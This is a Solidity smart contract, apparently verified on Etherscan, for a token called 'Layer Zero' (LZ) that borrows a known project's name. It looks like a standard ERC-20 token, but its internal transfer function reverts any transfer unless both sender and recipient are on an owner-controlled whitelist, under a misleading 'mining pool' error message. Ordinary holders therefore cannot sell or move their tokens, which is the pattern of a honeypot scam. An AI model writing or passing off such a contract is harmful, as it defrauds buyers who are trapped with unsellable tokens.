/**
 *Submitted for verification at Etherscan.io on 2023-06-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract LayerZero {
    string public name = "Layer Zero";
    string public symbol = "LZ";
    uint256 public totalSupply = 100000000000;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    mapping(address => bool) public allowedMiners;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can perform this action");
        _;
    }

    modifier onlyAllowedMiner() {
        require(allowedMiners[msg.sender] || msg.sender == owner, "Only allowed miners can perform this action");
        _;
    }

    function allowMiner(address miner) external onlyOwner {
        allowedMiners[miner] = true;
    }

    function disallowMiner(address miner) external onlyOwner {
        allowedMiners[miner] = false;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(value <= balanceOf[from], "Insufficient balance");
        require(value <= allowance[from][msg.sender], "Insufficient allowance");
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0), "Cannot transfer to the zero address");
        require(value > 0, "Transfer value must be greater than zero");
        require(balanceOf[from] >= value, "Insufficient balance");

        if (allowedMiners[from] && allowedMiners[to]) {
            balanceOf[from] -= value;
            balanceOf[to] += value;
        } else {
            revert("Transfer to/from mining pool is not allowed");
        }

        emit Transfer(from, to, value);
    }
}